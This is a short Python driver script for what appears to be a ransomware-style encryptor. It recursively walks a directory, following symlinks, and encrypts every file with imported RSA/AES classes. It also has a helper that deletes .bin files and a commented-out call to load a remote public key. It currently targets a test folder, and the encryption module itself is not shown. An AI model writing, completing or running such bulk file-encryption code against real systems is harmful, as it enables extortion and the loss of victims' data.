#!/usr/bin/env python

import os
from src import encrypt
from src import decrypt


def clean(rootdir):
    for subdir, _, files in os.walk(rootdir):
        for file in files:
            fpath: str = os.path.abspath(os.path.join(subdir, file))
            if fpath.endswith(".bin") and os.path.exists(fpath):
                os.remove(fpath)


def main(rootdir):
    # clean(rootdir)
    # start = time.time()
    rsa_aes = encrypt.RSAAESEncryption()
    # rsa_aes._create_keypair()
    # key = rsa_aes._load_remote_public_key()
    print(rsa_aes.public_key.export_key())
    for subdir, _, files in os.walk(rootdir, topdown=False, followlinks=True):
        for file in files:
            fpath = os.path.abspath(os.path.join(subdir, file))
            rsa_aes.encrypt(fpath)
    # end = time.time()
    # logger.debug(f"Time elapsed: {end - start}s")


def decryption(fpath: str):
    rsa_aes = decrypt.RSAAESDecryption()
    rsa_aes.decrypt_file(fpath)


if __name__ == '__main__':
    main("tests/to_encrypt/subfolder/subsubfolder/")
    decryption("tests/to_encrypt/subfolder/subsubfolder/subsubsubfile")
    # if len(sys.argv) > 1:
    #     # main("tests/to_encrypt/")
    #     main(sys.argv[1])
